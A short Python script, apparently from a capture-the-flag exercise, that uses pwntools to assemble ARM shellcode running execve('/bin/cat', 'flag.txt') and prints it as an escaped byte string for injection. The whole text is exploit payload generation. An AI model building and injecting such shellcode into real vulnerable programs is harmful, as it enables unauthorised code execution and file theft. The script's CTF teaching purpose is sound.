from pwn import *
context.arch = 'arm'               # or 'arm/thumb' for Thumb
sc = asm(shellcraft.execve("/bin/cat", ["/bin/cat", "flag.txt"]))
print("b'" + ''.join(f'\\x{b:02x}' for b in sc) + "'")
